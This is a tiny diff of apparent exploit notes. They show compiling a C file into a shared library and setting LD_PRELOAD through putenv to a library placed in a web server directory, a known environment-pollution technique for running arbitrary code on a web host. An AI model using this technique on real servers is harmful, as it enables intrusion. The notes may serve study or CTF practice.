@@ -1,0 +1,5 @@
+- Build nhienit.c file:
+$ gcc -shared -fPIC nhienit.c -o nhienit.so
+
+- Env variable pollution
+putenv("LD_PRELOAD=/var/www/html/ld_preload/eval.so");
